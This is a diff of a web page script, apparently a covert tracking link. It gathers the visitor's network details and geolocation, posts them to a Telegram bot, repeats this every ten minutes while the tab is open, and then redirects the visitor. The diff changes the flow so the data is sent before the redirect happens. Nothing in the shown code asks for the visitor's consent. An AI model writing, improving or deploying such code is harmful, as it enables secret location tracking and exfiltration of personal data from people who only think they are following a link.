@@ -57,7 +57,7 @@ async function getNetworkInfo() {
   }
 }
 
-// Send to Telegram
+// Send data to Telegram
 function sendData(message) {
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: "POST",
@@ -77,7 +77,7 @@ ${networkInfo}`;
   sendData(message);
 }
 
-// Get location
+// Get location and send
 async function getAndSendLocation() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
@@ -95,14 +95,13 @@ async function getAndSendLocation() {
   }
 }
 
-// First send
-getAndSendLocation();
+// First send, then redirect
+getAndSendLocation().finally(() => {
+  window.location.href = redirectURL;
+});
 
-// Repeat every 10 minutes
+// Repeat every 10 minutes while the tab is open
 setInterval(getAndSendLocation, intervalMinutes * 60 * 1000);
-
-// Redirect instantly
-window.location.href = redirectURL;
 
 </script>
 
